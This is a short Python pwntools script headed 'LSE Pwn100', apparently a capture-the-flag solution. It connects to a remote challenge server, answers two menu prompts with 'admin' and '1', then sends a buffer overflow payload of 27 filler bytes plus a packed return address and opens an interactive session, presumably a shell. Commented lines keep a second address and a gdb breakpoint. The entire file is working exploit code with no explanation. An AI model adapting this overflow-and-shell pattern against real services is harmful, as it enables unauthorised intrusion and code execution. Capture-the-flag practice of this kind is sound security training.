#LSE Pwn100 

from pwn import *

#p = process ('./pwn100')

p = remote('ctf.lse.epita.fr',52114)

p.recv()
p.sendline('admin')

p.recv()
p.sendline('1')

p.recv()
p.sendline("A"*27+p32(0xf7ea2f70))

p.recv()

p.interactive()

#p64(0x0040084a)

#0x0040091c - gdb breakpoint



